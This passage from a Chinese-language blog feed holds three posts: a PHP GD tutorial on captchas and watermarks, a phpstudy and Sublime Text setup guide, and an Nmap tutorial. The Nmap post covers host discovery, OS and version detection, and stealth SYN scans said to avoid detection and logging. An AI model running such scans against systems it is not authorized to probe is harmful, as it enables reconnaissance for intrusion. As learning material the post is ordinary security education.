class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$color_bg</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">imagerectangle</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$width</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token variable">$height</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token variable">$color_border</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span><span class="token number">100</span> <span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token function">imagesetpixel</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">,</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token variable">$width</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token variable">$height</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">imagecolorallocate</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">,</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span><span class="token number">3</span> <span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token function">imageline</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">,</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token variable">$width</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token variable">$height</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token variable">$width</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token variable">$width</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token variable">$height</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">imagecolorallocate</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">,</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">imagettftext</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">,</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">35</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$color_string</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'font/HARLOWSI.TTF'</span><span class="token punctuation">,</span> <span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">imagejpeg</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">imagedestroy</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>代码粗略解释<br>1.用数组来实现验证码文本内容，然后随机函数，拼接字母，组成一段验证码。<br>2.提前定义一个空的<code>$string</code>，不然会报错。<br>3.颜色采用RGB模式，个别函数用时查手册。<br>运行结果：<br><img src="https://img-blog.csdnimg.cn/2020041100130423.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_QXVnZW5zdGVybg==,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"></p><h2 id="水印"><a href="#水印" class="headerlink" title="水印"></a>水印</h2><p>打开服务器或网络文件中已经存在的GIF、JPEG、PNG、WBMP格式图像。<br><code>imagecreatefromjpeg()</code><br><code>imagecreatefrompng()</code><br><code>imagecreatefromgif()</code><br><code>imagecreatefromwbmp()</code><br>创建或打开失败的时候就会返回空字符串，并且输出一条错误信息。<br><code>imagesx()</code>输出图片宽度<br><code>imagesy()</code>输出图片高度<br><code>getimagesize()</code>输出图像大小</p><h3 id="文字水印"><a href="#文字水印" class="headerlink" title="文字水印"></a>文字水印</h3><p>示例demo：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'Content-type:image/jpeg'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$img</span><span class="token operator">=</span><span class="token function">imagecreatefromjpeg</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'images/2.jpg'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$color</span><span class="token operator">=</span><span class="token function">imagecolorallocate</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$width</span><span class="token operator">=</span><span class="token function">imagesx</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$height</span><span class="token operator">=</span><span class="token function">imagesy</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$position</span><span class="token operator">=</span><span class="token function">imagettfbbox</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'font/HARLOWSI.TTF'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'Augendtern'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$stringwidth</span><span class="token operator">=</span><span class="token variable">$position</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token variable">$position</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">imagettftext</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$width</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">-</span><span class="token variable">$stringwidth</span><span class="token operator">-</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token variable">$height</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token variable">$color</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'font/HARLOWSI.TTF'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'Augenstern'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">imagejpeg</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">imagedestroy</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>效果如下：<br><img src="https://img-blog.csdnimg.cn/20200411201709695.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_QXVnZW5zdGVybg==,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>水印大小、位置均可调，还可以设定它占图片宽和高的比例。</p><h3 id="图片水印"><a href="#图片水印" class="headerlink" title="图片水印"></a>图片水印</h3><p>找好当水印的图片，与要加水印的图片放在同一路径下。<br><img src="https://img-blog.csdnimg.cn/20200411203450601.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_QXVnZW5zdGVybg==,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>demo示例：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'Content-type:image/jpeg'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$img</span><span class="token operator">=</span><span class="token function">imagecreatefromjpeg</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'images/2.jpg'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$watermark</span><span class="token operator">=</span><span class="token function">imagecreatefromgif</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'images/2.gif'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$color</span><span class="token operator">=</span><span class="token function">imagecolorallocate</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$width</span><span class="token operator">=</span><span class="token function">imagesx</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$height</span><span class="token operator">=</span><span class="token function">imagesy</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$watermarkwidth</span><span class="token operator">=</span><span class="token function">imagesx</span><span class="token punctuation">(</span><span class="token variable">$watermark</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$watermarkheight</span><span class="token operator">=</span><span class="token function">imagesy</span><span class="token punctuation">(</span><span class="token variable">$watermark</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$position</span><span class="token operator">=</span><span class="token function">imagettfbbox</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'font/HARLOWSI.TTF'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'Augendtern'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$stringwidth</span><span class="token operator">=</span><span class="token variable">$position</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token variable">$position</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">imagettftext</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$width</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">-</span><span class="token variable">$stringwidth</span><span class="token operator">-</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token variable">$height</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token variable">$color</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'font/HARLOWSI.TTF'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'Augenstern'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">imagecopy</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">,</span> <span class="token variable">$watermark</span><span class="token punctuation">,</span> <span class="token number">400</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$watermarkwidth</span><span class="token punctuation">,</span> <span class="token variable">$watermarkheight</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">imagejpeg</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">imagedestroy</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>运行结果有文字水印还有图片水印<br><img src="https://img-blog.csdnimg.cn/20200411204901809.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>效果不怎么样，将就着还能看。<br>部分参数说明：<br><code>imagecopy()</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">imagecopy</span><span class="token punctuation">(</span>dst_im<span class="token punctuation">,</span> src_im<span class="token punctuation">,</span> dst_x<span class="token punctuation">,</span> dst_y<span class="token punctuation">,</span> src_x<span class="token punctuation">,</span> src_y<span class="token punctuation">,</span> src_w<span class="token punctuation">,</span> src_h<span class="token punctuation">)</span></code></pre><p>第一个参数是加水印的图片（方便区分，我叫它原图），<br>第二个参数是水印图片，<br>第三个参数是水印要加在原图的什么位置。左上角还是右上角来着我容易记混，干脆就不记了，直接看效果来判断向什么方向移动。<br>第四个参数和第五个参数是从水印图片什么位置开始拷贝。同样不记得位置，（办法总比困难多，我相信都会有自己的解决办法的。😁😁😁）<br>第六个参数和第七个参数是截取水印的宽度和高度。</p><p>这次学习就到这里。 坚持下去，加油。奥利给！🤣</p>]]></content>
      
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpstudy+Sublime Test3创建PHP编译环境</title>
      <link href="/posts/770559a3/"/>
      <url>/posts/770559a3/</url>
      
        <content type="html"><![CDATA[<p>前言：学习PHP，一个好的编译软件是必不可少的（看着舒服）。刚好有Sublime（很强大的一个文本编译器谁用谁爽），就用它来编。</p><h1 id="phpstudy设置"><a href="#phpstudy设置" class="headerlink" title="phpstudy设置"></a>phpstudy设置</h1><p>打开phpstudy，设置php的版本，我这里修改的是<code>php-5.4.45-nts+Apache</code><img src="https://img-blog.csdnimg.cn/20200327001135501.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>然后记住你选的这个版本。在phpstudy的文件目录下找到它。<br><img src="https://img-blog.csdnimg.cn/20200327001912415.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>找到后，打开它，复制它的路径<br><img src="https://img-blog.csdnimg.cn/20200327002011525.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>添加环境变量<br><img src="https://img-blog.csdnimg.cn/20200327002141365.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>然后添加粘贴复制的路径，就添加成功了，<br><img src="https://img-blog.csdnimg.cn/20200327002306628.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>然后确定=&gt;确定=&gt;确定<br>打开cmd，输入<code>php -v</code>，出现下图的信息就是成功了。<br><img src="https://img-blog.csdnimg.cn/2020032700244348.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"></p><h1 id="Sublime"><a href="#Sublime" class="headerlink" title="Sublime"></a>Sublime</h1><p>进入Sublime，点击tools=&gt;Build System=&gt;New Build System<br><img src="https://img-blog.csdnimg.cn/20200327002706490.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>然后出现这个<br><img src="https://img-blog.csdnimg.cn/20200327002839145.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>把原来的代码全删了，复制下面的内容，</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token punctuation">&#123;</span>     <span class="token double-quoted-string string">"cmd"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token double-quoted-string string">"php"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"<span class="token interpolation"><span class="token variable">$file</span></span>"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token double-quoted-string string">"file_regex"</span><span class="token punctuation">:</span> <span class="token double-quoted-string string">"php$"</span><span class="token punctuation">,</span>     <span class="token double-quoted-string string">"selector"</span><span class="token punctuation">:</span> <span class="token double-quoted-string string">"source.php"</span> <span class="token punctuation">&#125;</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200327003104822.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>然后Ctrl+Shift+S另存为<code>Roaming\Sublime Text 3\Packages\User</code><br><img src="https://img-blog.csdnimg.cn/20200327003320179.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>然后保存就完成了<br>可以创建一个php项目试试效果。<br><img src="https://img-blog.csdnimg.cn/2020032700351160.png" alt="Augenstern" loading="lazy"><br>这个是可以选择的，然后选择PHP就可以直接写代码<br><img src="https://img-blog.csdnimg.cn/20200327003735261.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>这是个错误案例，像我一样的新手可能会犯这样的错误。<br>原因很简单就是没有保存，将文件保存后就可以运行了。<br>在看一个正确的<br><img src="https://img-blog.csdnimg.cn/2020032700444019.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"></p><h1 id="小疑问（已解决）"><a href="#小疑问（已解决）" class="headerlink" title="小疑问（已解决）"></a>小疑问（已解决）</h1><p>我原本有个疑问就是PHP要编译的话需要Apache+php运行环境+mysql那我把phpstudy关了，是不是就不能编译了？？？？？然后我就去试了一下，发现这些不影响。还可以编译运行。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 工具人 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nmap学习</title>
      <link href="/posts/d5f81032/"/>
      <url>/posts/d5f81032/</url>
      
        <content type="html"><![CDATA[<p>Nmap是个强大的扫描工具</p><p>1、用主机名和IP地址扫描</p><pre class="language-bash" data-language="bash"><code class="language-bash">用主机名和IP地址进行扫描大概是最为常见的一种扫描方式，示例：nmap www.baidu.com</code></pre><p>这样可以得到被扫描目标的端口、服务和Mac信息</p><p><img src="https://img-blog.csdnimg.cn/20200524153620648.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_RGV2b3Vy,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"></p><p>2、列出详细信息</p><pre class="language-bash" data-language="bash"><code class="language-bash">使用-v参数来让nmap返回更详细的信息</code></pre><p><img src="https://img-blog.csdnimg.cn/20200524153923633.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_RGV2b3Vy,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"></p><p>3、扫描多个目标</p><pre class="language-bash" data-language="bash"><code class="language-bash">如果你已经知道了多个目标的IP或者主机名，你可以直接在命令后面添加多个需要扫描的目标。示例：nmap <span class="token number">61.135</span>.169.121 <span class="token number">103.95</span>.221.36</code></pre><p><img src="https://img-blog.csdnimg.cn/20200524160039135.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_RGV2b3Vy,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"></p><pre class="language-bash" data-language="bash"><code class="language-bash">如果你并不知道，只是需要扫描整个子网的网段或者是某个IP范围内的目标，可以使用通配符*来扫描。示例：nmap <span class="token number">192.168</span>.0.*这样nmap就会自动扫描从192.168.0.0到192.168.0.255的所有目标，然后给出信息。</code></pre><p><img src="https://img-blog.csdnimg.cn/20200524160211463.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_RGV2b3Vy,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"></p><pre class="language-bash" data-language="bash"><code class="language-bash">可是如果在这个子网里你已经知道某台机器的信息，不想再次扫描，需要用到-exclude参数来排除一些目标。示例：nmap <span class="token number">192.168</span>.0.* --exclude <span class="token number">192.168</span>.0.1</code></pre><p><img src="https://img-blog.csdnimg.cn/20200524160443887.png" alt="j4y" loading="lazy"></p><pre class="language-bash" data-language="bash"><code class="language-bash">如果你并不想扫描整个子网，而是同一子网下的多个目标，可以对IP地址的最后一位进行添加来执行扫描。示例：nmap <span class="token number">192.168</span>.0.1,2,3这样nmap就会对这三个目标进行扫描。又或者可以使用nmap <span class="token number">192.168</span>.0.1-10这样来指定多个扫描的目标也是可以的。</code></pre><pre class="language-bash" data-language="bash"><code class="language-bash">如果你已经有了一个信息列表，也可以保存成txt文件，而无需手动输入。示例：nmap -iL object.txt这样nmap就会对你txt文件中的每个目标进行扫描。</code></pre><p>4、得到目标的系统信息</p><pre class="language-bash" data-language="bash"><code class="language-bash">得到目标系统的信息是必不可少的，我们为了得到系统信息和路由跟踪，需要-A参数来实现。示例：nmap -A <span class="token number">192.168</span>.0.1当然，nmap是通过配对来实现操作系统信息的判别，所以nmap有时并不能准确识别出真实的信息，不提供任何信息或者提供好几种可能性都是正常的。-A并不是唯一的选择，-O和-osscan-guess都可以进行操作系统信息的探测。</code></pre><p><img src="https://img-blog.csdnimg.cn/20200524161217758.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_RGV2b3Vy,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"></p><p>5、检测目标保护措施</p><pre class="language-bash" data-language="bash"><code class="language-bash">现在已经过了洪水攻击和DDoS的嚣张时刻，虽然大规模DDoS依旧恐怖，但是已经不在是首选的攻击手段。因为防护性的考虑，所以如果存在过滤规则或者防火墙的目标都会对数据包进行过滤。那么我们怎么知道目标是否存在这类的防护手段呢？我们可以采用-sA和-PN两个参数来进行探测扫描。</code></pre><p>6、扫描在线主机</p><pre class="language-bash" data-language="bash"><code class="language-bash">扫描一个网段的过程中，如果目标并没有上线，有可能一无所获，所以在扫描之前可以先判断是否有主机存活。我们采用-sP参数来判断存活主机都有哪些。示例：nmap –sP192.168.0.*</code></pre><p>7、快速扫描</p><pre class="language-bash" data-language="bash"><code class="language-bash">Nmap大多数扫描都是非常迅速的，但也有时会出现极其缓慢的情况，那么如果我只是想初步进行判断，而不是深入分析的话，一次快速扫描可以捕捉到你想要的大多数信息。示例：namp –F192.168.0.1这个参数扫描的范围仅限定在nmap-services这个文件中的端口，如果一般不加参数的命令，扫描范围是1000个最有可能开放的端口。</code></pre><p>8、判断版本</p><pre class="language-bash" data-language="bash"><code class="language-bash">新的软件版本一般来讲会提供更好的性能和体验，所以紧跟时代形势，使用新版本的软件对我们来说也是至关重要的一点。我们可以通过-V来对安装的nmap版本进行查看，如果升级的话可以采用apt-get update（默认你使用的是Kali）</code></pre><p>9、特殊扫描</p><pre class="language-bash" data-language="bash"><code class="language-bash">如果你只是关心某个端口的开启情况，就没有必要让nmap从头到尾扫描一遍，则可以使用-p选项来指定你想要的那个端口。示例：nmap –p80 <span class="token number">192.168</span>.0.1或者nmap –p <span class="token number">80,443</span> <span class="token number">192.168</span>.0.1又或者nmap –p80-160 <span class="token number">192.168</span>.0.1按顺序扫描可以使用-r来实现，这样nmap不会随机进行扫描。示例：nmap –r192.168.0.1只扫描TCP端口和UDP端口分别使用-p T:80,8888和-sU <span class="token number">53</span>来实现对某个特定端口的扫描。</code></pre><p>10、扫描本机的网络接口</p><pre class="language-bash" data-language="bash"><code class="language-bash">本机的网络信息是不是只有ifconfig一个选择呢？显然不是，nmap也提供了-iflist来检测本机的信息。示例：nmap -iflist</code></pre><p>11、目标服务详细信息</p><pre class="language-bash" data-language="bash"><code class="language-bash">目标开启的服务的版本也是我们应该关注的问题，在特定版本下所存在的漏洞都是我们应该加以利用的工具。 示例：nmap –sV192.168.0.1</code></pre><p>12、所谓ACK和SYN扫描</p><pre class="language-bash" data-language="bash"><code class="language-bash"> Ping的请求现在会被大多数的防火墙所拦截，直接丢弃数据包。但是我们可以采用TCPACK和TCP SYN的方式来进行扫描。通过向目标主机的端口发送ACK包，如果收到RST包，说明该端口没有被防火墙屏蔽；没有收到RST包，说明被屏蔽。SYN称为半开放扫描，因为这种技术使得Nmap不需要通过完整的握手，就能获得远程主机的信息。Nmap发送SYN包到远程主机，但是它不会产生任何会话.因此不会在目标主机上产生任何日志记录,因为没有形成会话。这个就是SYN扫描的优势。示例：nmap –PS192.168.0.1依旧只关心特定端口的扫描应该怎么做呢？示例：nmap –PA–p <span class="token number">80</span> <span class="token number">192.168</span>.0.1或者nmap –PS–p <span class="token number">80</span> <span class="token number">192.168</span>.0.1</code></pre><p>13、隐蔽扫描</p><p>大张旗鼓的多次扫描容易被防火墙记录下来，然后强行过滤，为了降低被发现的概率，我们可以采用隐蔽扫描。</p><p>示例：nmap –sS 192.168.0.1</p><p>14、使用TCP SYN扫描常用端口</p><pre class="language-bash" data-language="bash"><code class="language-bash">示例：nmap –sT <span class="token number">192.168</span>.0.1</code></pre><p>15、TCP空扫描</p><pre class="language-none"><code class="language-none">示例：nmap -sN 192.168.0.1</code></pre><p>16、完整扫描</p><pre class="language-bash" data-language="bash"><code class="language-bash">一次完整全面的扫描包括主机存活、操作系统版本探测、应用程序版本探测、端口扫描等等。示例：nmap –T4–A –v <span class="token number">192.168</span>.0.1扫描速度共有6个（0-5）等级，一般来讲可以使用T4，速度越快越可能被过滤和屏蔽。-v是显示冗余信息</code></pre><p>17、主机发现的详细参数</p><pre class="language-powershell" data-language="powershell"><code class="language-powershell"><span class="token operator">-</span><span class="token function">sL</span>:List Scan 列表扫描，仅将指定的目标的IP列举出来，不进行主机发现。<span class="token operator">-</span>sn:Ping Scan 只进行主机发现，不进行端口扫描。<span class="token operator">-</span>Pn:将所有指定的主机视作开启的，跳过主机发现的过程。<span class="token operator">-</span><span class="token function">PS</span><span class="token operator">/</span>PA<span class="token operator">/</span>PU<span class="token operator">/</span>PY<span class="token namespace">[portlist]</span>:使用TCPSYN<span class="token operator">/</span>ACK或SCTP INIT<span class="token operator">/</span><span class="token function">ECHO</span>方式进行发现。<span class="token 